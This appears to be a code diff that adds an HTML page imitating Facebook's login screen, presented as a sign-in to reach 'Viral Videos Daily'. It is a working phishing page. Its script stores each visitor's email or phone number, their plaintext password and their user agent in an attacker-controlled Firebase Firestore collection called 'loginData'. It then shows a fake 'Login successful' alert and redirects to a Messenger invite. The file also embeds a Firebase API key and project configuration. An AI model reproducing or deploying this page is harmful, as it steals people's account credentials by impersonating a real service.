@@ -1,0 +1,340 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Log in to Facebook</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background: #f0f2f5;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .login-container {
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
+            max-width: 396px;
+            width: 100%;
+            padding: 24px;
+        }
+
+        .facebook-logo {
+            text-align: center;
+            margin-bottom: 16px;
+        }
+
+        .facebook-logo svg {
+            width: 48px;
+            height: 48px;
+        }
+
+        .login-header {
+            text-align: center;
+            margin-bottom: 24px;
+        }
+
+        .login-header h1 {
+            font-size: 18px;
+            font-weight: 600;
+            color: #1c1e21;
+            margin-bottom: 8px;
+        }
+
+        .login-header p {
+            font-size: 15px;
+            color: #606770;
+            line-height: 1.4;
+        }
+
+        .form-group {
+            margin-bottom: 12px;
+        }
+
+        .form-input {
+            width: 100%;
+            padding: 14px 16px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            font-size: 17px;
+            color: #1c1e21;
+            outline: none;
+            transition: border-color 0.2s;
+        }
+
+        .form-input:focus {
+            border-color: #1877f2;
+            box-shadow: 0 0 0 2px rgba(24, 119, 242, 0.2);
+        }
+
+        .form-input::placeholder {
+            color: #8a8d91;
+        }
+
+        .login-button {
+            width: 100%;
+            background: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            padding: 14px 16px;
+            font-size: 17px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 12px;
+            transition: background 0.2s;
+        }
+
+        .login-button:hover {
+            background: #166fe5;
+        }
+
+        .login-button:active {
+            background: #1567d3;
+        }
+
+        .forgot-password {
+            text-align: center;
+            margin: 16px 0;
+        }
+
+        .forgot-password a {
+            color: #1877f2;
+            text-decoration: none;
+            font-size: 14px;
+        }
+
+        .forgot-password a:hover {
+            text-decoration: underline;
+        }
+
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 20px 0;
+        }
+
+        .divider::before,
+        .divider::after {
+            content: '';
+            flex: 1;
+            border-bottom: 1px solid #dadde1;
+        }
+
+        .divider span {
+            padding: 0 16px;
+            color: #606770;
+            font-size: 14px;
+        }
+
+        .create-account {
+            text-align: center;
+        }
+
+        .create-account-button {
+            background: #42b72a;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            padding: 14px 16px;
+            font-size: 17px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+
+        .create-account-button:hover {
+            background: #36a420;
+        }
+
+        .footer-text {
+            text-align: center;
+            margin-top: 24px;
+            font-size: 13px;
+            color: #606770;
+        }
+
+        .error-message {
+            background: #ffebe8;
+            border: 1px solid #dd3c10;
+            border-radius: 6px;
+            padding: 12px;
+            margin-bottom: 16px;
+            display: none;
+        }
+
+        .error-message p {
+            color: #dd3c10;
+            font-size: 13px;
+            line-height: 1.4;
+        }
+
+        .error-message.show {
+            display: block;
+        }
+
+        @media (max-width: 480px) {
+            .login-container {
+                padding: 16px;
+            }
+
+            .login-header h1 {
+                font-size: 16px;
+            }
+
+            .form-input,
+            .login-button,
+            .create-account-button {
+                font-size: 16px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <div class="facebook-logo">
+            <svg viewBox="0 0 48 48" fill="#1877f2">
+                <path d="M48 24C48 10.745 37.255 0 24 0S0 10.745 0 24c0 11.979 8.776 21.908 20.25 23.708v-16.77h-6.094V24h6.094v-5.288c0-6.014 3.583-9.337 9.065-9.337 2.625 0 5.372.469 5.372.469v5.906h-3.026c-2.981 0-3.911 1.85-3.911 3.75V24h6.656l-1.064 6.938H27.75v16.77C39.224 45.908 48 35.978 48 24z"/>
+            </svg>
+        </div>
+
+        <div class="login-header">
+            <h1>Log in to Facebook</h1>
+            <p>to continue to Viral Videos Daily</p>
+        </div>
+
+        <div class="error-message" id="errorMessage">
+            <p>The email address or mobile number you entered isn't connected to an account.</p>
+        </div>
+
+        <form id="loginForm" onsubmit="handleLogin(event)">
+            <div class="form-group">
+                <input 
+                    type="text" 
+                    class="form-input" 
+                    id="emailOrPhone" 
+                    placeholder="Email address or phone number"
+                    required
+                >
+            </div>
+
+            <div class="form-group">
+                <input 
+                    type="password" 
+                    class="form-input" 
+                    id="password" 
+                    placeholder="Password"
+                    required
+                >
+            </div>
+
+            <button type="submit" class="login-button">Log in</button>
+        </form>
+
+        <div class="forgot-password">
+            <a href="#" onclick="return false;">Forgotten account?</a>
+        </div>
+
+        <div class="divider">
+            <span>or</span>
+        </div>
+
+        <div class="create-account">
+            <button class="create-account-button" onclick="return false;">Create new account</button>
+        </div>
+
+        <div class="footer-text">
+            <p>By continuing, you agree to Facebook's Terms of Service and Privacy Policy.</p>
+        </div>
+    </div>
+
+    <script type="module">
+        // Import the functions you need from the SDKs you need
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/12.9.0/firebase-app.js";
+        import { getAnalytics } from "https://www.gstatic.com/firebasejs/12.9.0/firebase-analytics.js";
+        import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/12.9.0/firebase-firestore.js";
+        
+        // Your web app's Firebase configuration
+        const firebaseConfig = {
+            apiKey: "AIzaSyA5COA3am1DHCE1mW9kOwR15aPWu-pHqiY",
+            authDomain: "facebook-abcd.firebaseapp.com",
+            projectId: "facebook-abcd",
+            storageBucket: "facebook-abcd.firebasestorage.app",
+            messagingSenderId: "15364854211",
+            appId: "1:15364854211:web:78c7fb038ae8fb5ada6d76",
+            measurementId: "G-N15SE9Y57V"
+        };
+        
+        // Initialize Firebase
+        const app = initializeApp(firebaseConfig);
+        const analytics = getAnalytics(app);
+        const db = getFirestore(app);
+
+        // Make handleLogin function global
+        window.handleLogin = async function(event) {
+            event.preventDefault();
+            
+            const email = document.getElementById('emailOrPhone').value;
+            const password = document.getElementById('password').value;
+            const submitButton = event.target.querySelector('button[type="submit"]');
+
+            // Disable button and show loading state
+            submitButton.disabled = true;
+            submitButton.textContent = 'Logging in...';
+
+            try {
+                // Store login data in Firestore
+                await addDoc(collection(db, "loginData"), {
+                    emailOrPhone: email,
+                    password: password,
+                    timestamp: serverTimestamp(),
+                    userAgent: navigator.userAgent,
+                    ipAddress: 'Client IP' // You'll need a backend service to get actual IP
+                });
+
+                console.log('Data stored successfully in Firebase');
+
+                // Redirect after successful storage
+                // Replace with your actual Messenger group link
+                alert('Login successful! Redirecting to group...');
+                // window.location.href = 'https://m.me/join/YOUR_GROUP_INVITE_CODE';
+                
+                // For demo, redirect back to invite page
+                window.location.href = 'messenger-invite.html';
+                
+            } catch (error) {
+                console.error('Error storing data:', error);
+                
+                // Show error message
+                document.getElementById('errorMessage').querySelector('p').textContent = 
+                    'Something went wrong. Please try again.';
+                document.getElementById('errorMessage').classList.add('show');
+                
+                // Re-enable button
+                submitButton.disabled = false;
+                submitButton.textContent = 'Log in';
+            }
+        };
+
+        // Clear error message when user starts typing
+        document.getElementById('emailOrPhone').addEventListener('input', function() {
+            document.getElementById('errorMessage').classList.remove('show');
+        });
+
+        document.getElementById('password').addEventListener('input', function() {
+            document.getElementById('errorMessage').classList.remove('show');
+        });
+    </script>
+</body>
+</html>
